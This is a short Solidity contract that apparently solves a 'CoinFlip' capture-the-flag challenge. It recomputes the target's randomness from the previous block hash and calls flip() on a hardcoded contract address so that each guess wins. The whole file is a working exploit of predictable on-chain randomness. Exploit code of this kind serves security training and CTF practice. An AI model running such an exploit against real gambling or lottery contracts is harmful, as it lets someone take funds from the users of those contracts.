// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./ICoinFlip.sol";

contract FakeCoinFlip {
    using SafeMath for uint256;
    ICoinFlip public Contract =
        ICoinFlip(0xcC25f0E79481234b3AE7005E9BC28881ce7759e3);

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function checkguess() public returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool guess = coinFlip == 1 ? true : false;

        Contract.flip(guess);

        return Contract.consecutiveWins();
    }
}
